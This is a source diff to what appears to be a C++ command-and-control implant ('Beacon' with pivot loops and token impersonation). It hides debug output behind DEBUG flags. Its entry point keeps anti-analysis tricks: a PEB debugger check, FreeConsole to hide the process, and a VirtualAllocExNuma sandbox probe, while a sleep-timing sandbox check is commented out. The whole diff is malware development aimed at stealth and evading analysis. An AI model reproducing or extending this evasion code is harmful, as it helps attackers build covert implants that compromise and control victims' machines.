@@ -168,8 +168,11 @@ void BeaconMain(shared_ptr<Beacon> beacon, std::chrono::time_point<std::chrono::
                     else
                         res = ImpersonateLoggedOnUser(token::getToken());
                     //auto res = ImpersonateLoggedOnUser(token::getToken());
-                    if (res == FALSE)
+                    if (res == FALSE) {
+#ifdef DEBUG
                         std::cout << "SetThreadToken failed with error: " << GetLastError() << std::endl;
+#endif
+                    }
                 }
                 auto res = it_2->second(it->id(), it->data());
                 if (htoken != INVALID_HANDLE_VALUE) {
@@ -420,7 +423,9 @@ void BeaconMainPivot(shared_ptr<Beacon> beacon, std::chrono::time_point<std::chr
 }
 void BeaconMainLoopPivot(shared_ptr<Beacon> beacon) {
     if (!beacon->BeaconInit()) {
+#ifdef DEBUG
         cout << "Error beaconInit returned: false" << endl;
+#endif
         return;
     }
     //auto nextCheckIn = std::chrono::system_clock::now() + std::chrono::nanoseconds(beacon->Duration());
@@ -445,7 +450,9 @@ void BeaconMainLoopPivot(shared_ptr<Beacon> beacon) {
 }
 void BeaconMainLoop(shared_ptr<Beacon> beacon) {
      if (!beacon->BeaconInit()) {
+#ifdef DEBUG
         cout << "Error beaconInit returned: false" << endl;
+#endif
         return;
     }
     //auto nextCheckIn = std::chrono::system_clock::now() + std::chrono::nanoseconds(beacon->Duration());
@@ -503,22 +510,25 @@ void BeaconMainLoop(shared_ptr<Beacon> beacon) {
 //    }
 //}
 int Entry() {
+#ifdef DEBUG
+    cout << "HELLO WORLD" << endl;
+#endif
 #ifndef DEBUG
     PPEB pPEB = (PPEB)__readgsqword(0x60);
     if (pPEB->BeingDebugged) return 0;
 
     FreeConsole();
 
-    ULONGLONG uptimeBeforeSleep = GetTickCount64();
-    typedef NTSTATUS(WINAPI* PNtDelayExecution)(IN BOOLEAN, IN PLARGE_INTEGER);
-    PNtDelayExecution pNtDelayExecution = (PNtDelayExecution)GetProcAddress(GetModuleHandleW(L"ntdll.dll"), "NtDelayExecution");
-    LARGE_INTEGER delay;
+    //ULONGLONG uptimeBeforeSleep = GetTickCount64();
+    //typedef NTSTATUS(WINAPI* PNtDelayExecution)(IN BOOLEAN, IN PLARGE_INTEGER);
+    //PNtDelayExecution pNtDelayExecution = (PNtDelayExecution)GetProcAddress(GetModuleHandleW(L"ntdll.dll"), "NtDelayExecution");
+    //LARGE_INTEGER delay;
+    //PVOID m = NULL;
+    //delay.QuadPart = -6000 * 100000; // 60 seconds
+    //pNtDelayExecution(FALSE, &delay);
+    //ULONGLONG uptimeAfterSleep = GetTickCount64();
+    //if ((uptimeAfterSleep - uptimeBeforeSleep) < 60000) return false;
     PVOID m = NULL;
-    delay.QuadPart = -6000 * 100000; // 60 seconds
-    pNtDelayExecution(FALSE, &delay);
-    ULONGLONG uptimeAfterSleep = GetTickCount64();
-    if ((uptimeAfterSleep - uptimeBeforeSleep) < 60000) return false;
-
     m = VirtualAllocExNuma(GetCurrentProcess(), NULL, 0x1000, 0x3000, 0x4, 0);
     if (m == NULL)
         return 0;
